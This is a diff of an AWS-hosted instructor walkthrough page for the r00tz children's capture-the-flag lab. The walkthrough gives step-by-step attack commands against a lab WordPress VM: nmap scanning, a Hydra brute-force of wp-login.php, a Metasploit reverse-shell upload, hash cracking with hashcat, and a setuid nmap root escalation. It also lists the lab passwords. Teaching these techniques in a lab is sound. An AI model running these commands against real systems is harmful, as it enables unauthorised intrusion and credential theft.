@@ -42,7 +42,7 @@
     
     
       
-        <title>Instructor Walkthrough - r00tz CTF on AWS</title>
+        <title>Instructor Walkthrough - r00tz CTF by AWS</title>
       
     
     
@@ -157,7 +157,7 @@
             
               
                 <span class="md-header-nav__topic">
-                  r00tz CTF on AWS
+                  r00tz CTF by AWS
                 </span>
                 <span class="md-header-nav__topic">
                   Instructor Walkthrough
@@ -255,14 +255,12 @@
         
   <li class="md-tabs__item">
     
-      <a href=".." title="Overview" class="md-tabs__link md-tabs__link--active">
-        Overview
+      <a href=".." title="Security Capture the Flag (CTF)" class="md-tabs__link md-tabs__link--active">
+        Security Capture the Flag (CTF)
       </a>
     
   </li>
 
-      
-        
       
         
       
@@ -308,12 +306,12 @@
   <!-- Site title -->
   <label class="md-nav__title md-nav__title--site" for="__drawer">
     <a href="https://r00tz-ctf.awssecworkshops.com/"
-        title="r00tz CTF on AWS" class="md-nav__button md-logo">
+        title="r00tz CTF by AWS" class="md-nav__button md-logo">
       
         <img src="../assets/images/aws_smile_logo.png" width="48" height="48" />
       
     </a>
-    r00tz CTF on AWS
+    r00tz CTF by AWS
   </label>
 
   <!-- Repository containing source -->
@@ -348,8 +346,8 @@
 
 
   <li class="md-nav__item">
-    <a href=".." title="Overview" class="md-nav__link">
-      Overview
+    <a href=".." title="Security Capture the Flag (CTF)" class="md-nav__link">
+      Security Capture the Flag (CTF)
     </a>
   </li>
 
@@ -380,22 +378,53 @@
       
     
     
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Instructor Walkthrough
+      </label>
+    
     <a href="./" title="Instructor Walkthrough" class="md-nav__link md-nav__link--active">
       Instructor Walkthrough
     </a>
     
-  </li>
-
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
     
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#first-flag" title="First Flag" class="md-nav__link">
+    First Flag
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#second-flag" title="Second Flag" class="md-nav__link">
+    Second Flag
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#third-flag" title="Third Flag" class="md-nav__link">
+    Third Flag
+  </a>
+  
+</li>
       
       
       
-
-
-  <li class="md-nav__item">
-    <a href="../workbook/" title="Security Capture the Flag (CTF)" class="md-nav__link">
-      Security Capture the Flag (CTF)
-    </a>
+      
+      
+    </ul>
+  
+</nav>
+    
   </li>
 
     
@@ -440,6 +469,36 @@
     
   
   
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#first-flag" title="First Flag" class="md-nav__link">
+    First Flag
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#second-flag" title="Second Flag" class="md-nav__link">
+    Second Flag
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#third-flag" title="Third Flag" class="md-nav__link">
+    Third Flag
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -453,38 +512,45 @@
                   <a href="https://github.com/aws-samples/r00tz-ctf-on-aws/edit/master/docs/walkthrough.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                <h1 id="instructor-mr-robot-walkthrough">Instructor: Mr. Robot Walkthrough</h1>
+                <h1 id="instructor-mr-robot-walkthrough">Instructor <small>Mr. Robot Walkthrough</small></h1>
 <p>General guidance:</p>
 <ol>
 <li>Pay attention to the IP address- the VM may have a different IP address- if the kids copy &amp; insert their material</li>
 <li>Many command flags are case sensitive.  Pay attention to the case of command flags</li>
 <li>Be sure to ask the kids if they want to take a break after finding a flag.  Going through all 3 may be too advanced for many of the kids.</li>
 </ol>
-<p><strong><em>First Flag</em></strong></p>
+<h2 id="first-flag">First Flag</h2>
 <p>Students should first use <em>ip</em> to see their network details, then they should use <em>nmap</em> to find what hosts sit on the network. They should see one of the hosts has ports 80 and 443 open, indicating it’s probably hosting a web application. They should navigate to this ip address in a browser. They should execute:</p>
-<ul>
-<li><strong>Go to a Kali</strong><strong> terminal</strong></li>
-<li><strong>ip<strong><em>* </em></strong>*addr</strong><strong> show eth0</strong></li>
-<li><strong>nmap<strong><em>* </em></strong>*-n 10.13.13.0/24</strong></li>
-</ul>
-<p>[Image: image.png]The first flag can be found by navigating to the robots.txt for the site in the browser. From there, students should see there is a file called key-1-of-3.txt they can navigate to. In addition, there will be an fsociety.dic file, they should download that now. The process for getting there is:</p>
+<p><strong>Go to a Kali terminal</strong></p>
+<div class="codehilite"><pre><span></span>ip addr show eth0
+</pre></div>
+
+
+<div class="codehilite"><pre><span></span>nmap -n 10.13.13.0/24
+</pre></div>
+
+
+<p><img alt="Image" src="../images/instructor-flag1.png" title="Image" /></p>
+<p>The first flag can be found by navigating to the robots.txt for the site in the browser. From there, students should see there is a file called key-1-of-3.txt they can navigate to. In addition, there will be an fsociety.dic file, they should download that now. The process for getting there is:</p>
 <ul>
 <li><strong><web app ****ip**** address>/robots.txt</strong></li>
 <li><strong><web app ****ip**** address>/key-1-of-3.txt</strong></li>
 </ul>
-<p><strong><em>Second Flag</em></strong></p>
+<h2 id="second-flag">Second Flag</h2>
 <p>The second flag is a little trickier and will take a bit more time. First, students should try to navigate to a page that doesn’t exist. This should generate a 404 page; this will reveal that the site is powered via wordpress. One of the features of wordpress is the ability to login as either a user or an admin. This site is found on /wp-login.php. The steps are:</p>
 <ul>
 <li><strong>Navigate to <web app ****ip**** address>/</strong><strong>completelyfakepage</strong></li>
 <li><strong>Click </strong><strong>Log in on the bottom left</strong></li>
 </ul>
-<p>[Image: image.png]From here the student will need to do some password cracking to be able to login. First, they should try and login and see that the site will say if a username is correct or not. They should try elliot (name of the main character in the show) to see it’ll say the password is wrong. They should open developer tools and go to the network tab while trying to login from here they should look at a sample call to see what that looks like.</p>
+<p><img alt="Image" src="../images/instructor-flag2.png" title="Image" /></p>
+<p>From here the student will need to do some password cracking to be able to login. First, they should try and login and see that the site will say if a username is correct or not. They should try elliot (name of the main character in the show) to see it’ll say the password is wrong. They should open developer tools and go to the network tab while trying to login from here they should look at a sample call to see what that looks like.</p>
 <ul>
 <li><strong>Open developer tools and go to network tab</strong></li>
 <li><strong>Login with a random username/password</strong></li>
 <li><strong>Try logging in with <strong><em>*elliot</em></strong>* as username</strong></li>
 </ul>
-<p>[Image: image.png]This is where the fsociety.dic file comes into play. However, it contains a lot of duplicates and will slow down the cracking process, so it should be deduped first. This can be done via: <em>sort -u <strong>fsocity.dic</strong> -o </em><em>uniq.dic</em></p>
+<p><img alt="Image" src="../images/instructor-flag2b.png" title="Image" /></p>
+<p>This is where the fsociety.dic file comes into play. However, it contains a lot of duplicates and will slow down the cracking process, so it should be deduped first. This can be done via: <em>sort -u <strong>fsocity.dic</strong> -o </em><em>uniq.dic</em></p>
 <ul>
 <li><strong>Go to <web app ****ip**** address>/<strong><em>*foscity.dic</em></strong>* and download the file</strong></li>
 <li><strong>On the downloaded file<strong><em>* (in a terminal)</em></strong><em> run: <strong><em>* sort -u </em></strong></em>fsocity.dic<strong><em>* -o </em></strong>*uniq.dic</strong></li>
@@ -492,9 +558,13 @@
 <p>From here, the student can run THC Hydra, a password cracking tool. Based on the knowledge they gained about the login calls and their failed attempt they should have everything they need to start the cracking a sample command is: <em>hydra -<strong>l</strong> <strong>elliot</strong> -P <strong>uniq.dic</strong> <strong><SERVER IP></strong> http-post-form “<strong>/</strong>wp-login.php:log<strong>=^USER^&amp;</strong>pwd<strong>=^PASS^:</strong>F=is incorrect</em><em>”</em> which will take significantly less time. Finally, the correct login is: user: elliot, pass: ER28-0652. The process is as follows:</p>
 <ul>
 <li><strong>Go to a Kali</strong><strong> terminal</strong></li>
-<li><strong>h<strong><em>*ydra -l </em></strong><em>elliot<strong><em>* -P </em></strong></em>uniq.dic<strong><em>* <web app ****ip**** address> http-post-form “/</em></strong><em>wp-login.php:log<strong><em>*=^USER^&amp;</em></strong></em>pwd<strong><em>*=^PASS</em></strong>*^:F</strong><strong>=is incorrect”</strong></li>
 </ul>
-<p>[Image: image.png]Students are going to probably want to play around on the admin site for a while. Ultimately they’ll realize the second key isn’t on the web app. You should point out they likely need to get access onto the box to do that. Thankfully WordPress has a long history of vulnerabilities! Specifically one for performing reverse shell uploads. Metasploit is just the tool to do that for them.</p>
+<div class="codehilite"><pre><span></span>hydra -l elliot -P uniq.dic &lt;web app ip address&gt; http-post-form “/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=is incorrect”
+</pre></div>
+
+
+<p><img alt="Image" src="../images/instructor-flag2c.png" title="Image" /></p>
+<p>Students are going to probably want to play around on the admin site for a while. Ultimately they’ll realize the second key isn’t on the web app. You should point out they likely need to get access onto the box to do that. Thankfully WordPress has a long history of vulnerabilities! Specifically one for performing reverse shell uploads. Metasploit is just the tool to do that for them.</p>
 <p>Do make sure to talk about what Metasploit is and what makes it so useful.</p>
 <p>The process is as follows:</p>
 <ul>
@@ -508,18 +578,27 @@
 <li><strong>exploit</strong></li>
 <li><strong>In <strong><em>*meterpreter</em></strong>* run shell</strong></li>
 </ul>
-<p>[Image: image.png][Image: image.png][Image: image.png]The default meterpreter shell is kind of annoying and students won’t like it. They should setup a quick python script to give them a proper shell. The steps for this is as follows:</p>
-<ul>
-<li><strong><code>echo "import</code><strong><em>*<code>pty</code></em></strong><em><code>;</code><strong><em>*<code>pty.spawn</code></em></strong></em><code>('/bin/bash')" &gt; /tmp/asdf.py</code></strong></li>
-<li><strong><code>python /tmp/asdf.py</code></strong></li>
-</ul>
-<p>[Image: image.png]Students probably won’t know this but /home/ is really useful for finding info about who’s on the box. If they cd into the /home/ directory they should find there’s a user called robot. If they cd into /home/robot/ they should see two things: the second key file and an md5 hash of robot’s password. They won’t be able to access the file since they’re not robot. They should be able to see the hash in the password file though. The steps are as follows:</p>
+<p><img alt="Image" src="../images/instructor-flag2d.png" title="Image" /></p>
+<p><img alt="Image" src="../images/instructor-flag2e.png" title="Image" /></p>
+<p><img alt="Image" src="../images/instructor-flag2f.png" title="Image" /></p>
+<p>The default meterpreter shell is kind of annoying and students won’t like it. They should setup a quick python script to give them a proper shell. The steps for this is as follows:</p>
+<div class="codehilite"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">asdf</span><span class="o">.</span><span class="n">py</span>
+</pre></div>
+
+
+<div class="codehilite"><pre><span></span>python /tmp/asdf.py
+</pre></div>
+
+
+<p><img alt="Image" src="../images/instructor-flag2g.png" title="Image" /></p>
+<p>Students probably won’t know this but /home/ is really useful for finding info about who’s on the box. If they cd into the /home/ directory they should find there’s a user called robot. If they cd into /home/robot/ they should see two things: the second key file and an md5 hash of robot’s password. They won’t be able to access the file since they’re not robot. They should be able to see the hash in the password file though. The steps are as follows:</p>
 <ul>
 <li><strong>cd /home/</strong></li>
 <li><strong>cd robot/</strong></li>
 <li><strong>cat password.raw-md5</strong></li>
 </ul>
-<p>[Image: image.png]You should let the student know that md5 is considered broken and easy to break. In addition, kali comes with a hash breaker called hashcat they can use to crack the password. Kali also comes with a wordlist they can use to brute force the password. This file is called rockyou. The steps for cracking it as follows:</p>
+<p><img alt="Image" src="../images/instructor-flag2h.png" title="Image" /></p>
+<p>You should let the student know that md5 is considered broken and easy to break. In addition, kali comes with a hash breaker called hashcat they can use to crack the password. Kali also comes with a wordlist they can use to brute force the password. This file is called rockyou. The steps for cracking it as follows:</p>
 <ul>
 <li><strong>Copy </strong><strong>the hash in the password.raw-md5 file</strong></li>
 <li><strong>Go to a Kali terminal</strong></li>
@@ -528,17 +607,23 @@
 <li><strong>hashcat<strong><em>* --force -a 0 -m 0 password.md5 /</em></strong>*usr</strong><strong>/share/wordlists/rockyou.txt -o cracked.txt</strong></li>
 <li><strong>cat cracked.txt</strong></li>
 </ul>
-<p>[Image: image.png][Image: image.png][Image: image.png]Now they have the username/password for the robot user. It’s robot/abcdefghijklmnopqrstuvwxyz essentially the password is all letters of the alphabet. Back on the server shell they should run su robot to login as them. Then they can access the second key. The process is as follows:</p>
+<p><img alt="Image" src="../images/instructor-flag2i.png" title="Image" /></p>
+<p><img alt="Image" src="../images/instructor-flag2j.png" title="Image" /></p>
+<p><img alt="Image" src="../images/instructor-flag2k.png" title="Image" /></p>
+<p>Now they have the username/password for the robot user. It’s robot/abcdefghijklmnopqrstuvwxyz essentially the password is all letters of the alphabet. Back on the server shell they should run su robot to login as them. Then they can access the second key. The process is as follows:</p>
 <ul>
 <li><strong>su</strong><strong> robot</strong></li>
 <li><strong>cat key-2-of-3.txt</strong></li>
 </ul>
-<p>[Image: image.png]<strong><em>Third Flag</em></strong></p>
+<p><img alt="Image" src="../images/instructor-flag2l.png" title="Image" /></p>
+<h2 id="third-flag">Third Flag</h2>
 <p>Finally, they’ll need to gain access to root, ideally the documentation explains what root is and why it’s so important to protect, but some reminding might be necessary. What they should also know is that some programs will actually run as a different user than the person that started the program, this means that while they ran the program, the program could be running as someone entirely different. Thus, if they can trick or get that program to open a shell, then they would be able to act as root if it’s set to run as root. This is where the setuid flag comes into play. They can find all programs with this flag set via: <em>find / -perm -4000 2&gt; /dev/null</em>. The process is as follows:</p>
-<ul>
-<li><strong>find / -perm -4000 2&gt; /dev/null</strong></li>
-</ul>
-<p>[Image: image.png]What they should find is a few programs with it set, most of them should make sense, but nmap should be strange to them. If they just run <em>nmap</em> with no flags, they should find it’s actually a version with an interactive mode! In addition, they should run ls -l on it and see it’s owned by root. Thus <em>nmap<strong> --interactive<em> will actually grant them a root shell, from there a simple </em>!</strong>sh</em> will grant a more usable shell with which they can navigate to /root and see the final flag. The steps are as follows:</p>
+<div class="codehilite"><pre><span></span>find / -perm -4000 2&gt; /dev/null
+</pre></div>
+
+
+<p><img alt="Image" src="../images/instructor-flag3.png" title="Image" /></p>
+<p>What they should find is a few programs with it set, most of them should make sense, but nmap should be strange to them. If they just run <em>nmap</em> with no flags, they should find it’s actually a version with an interactive mode! In addition, they should run ls -l on it and see it’s owned by root. Thus <em>nmap<strong> --interactive<em> will actually grant them a root shell, from there a simple </em>!</strong>sh</em> will grant a more usable shell with which they can navigate to /root and see the final flag. The steps are as follows:</p>
 <ul>
 <li><strong>ls -l /<strong><em>*usr</em></strong>*/local/bin/</strong><strong>nmap</strong></li>
 <li><strong>nmap</strong><strong> --interactive </strong></li>
@@ -548,8 +633,7 @@
 <li><strong>ls</strong></li>
 <li><strong>cat key-3-of-3.txt</strong></li>
 </ul>
-<p>[Image: image.png]</p>
-<p>After you have successfully setup your environment, you can proceed to the next module.</p>
+<p><img alt="Image" src="../images/instructor-flag3b.png" title="Image" /></p>
                 
                   
                 
@@ -585,13 +669,13 @@
           </a>
         
         
-          <a href="../workbook/" title="Security Capture the Flag (CTF)" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../contribute/" title="Contributing" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                Security Capture the Flag (CTF)
+                Contributing
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
